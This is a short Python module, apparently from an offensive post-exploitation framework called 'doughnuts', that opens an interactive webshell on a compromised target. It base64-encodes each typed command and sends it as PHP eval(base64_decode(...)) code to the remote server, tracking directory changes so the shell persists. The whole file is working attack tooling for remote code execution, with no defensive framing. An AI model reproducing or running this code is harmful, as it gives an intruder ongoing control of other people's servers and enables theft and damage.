from libs.config import gget, alias, color, set_namespace
from libs.myapp import send, base64_encode
from libs.app import getline


@alias(func_alias="ws")
def run():
    """
    webshell

    Get a webshell of target system.
    """
    print(color.cyan("Eenter interactive temporary webshell...\n\nUse 'back' command to return doughnuts.\n"))
    pwd = send(f'print(getcwd());').r_text.strip()
    while gget("loop"):
        print(f"webshell:{pwd} >>", end="")
        data = getline(False)
        lower_data = data.lower()
        if (lower_data.lower() in ['exit', 'quit', 'back']):
            break
        if (data == ''):
            print()
            continue
        data = base64_encode(data)
        if (lower_data.startswith("cd ") and len(lower_data) > 3):
            path = lower_data[3:].strip()
            pwd = send(f'eval("chdir(\'{pwd}\');chdir(\'{path}\');print(getcwd());");').r_text.strip()
        else:
            req = send(f'eval("chdir(\'{pwd}\');eval(base64_decode(\'{data}\'));");')
            print("\n" + req.r_text.strip() + "\n")
    set_namespace("webshell", False)
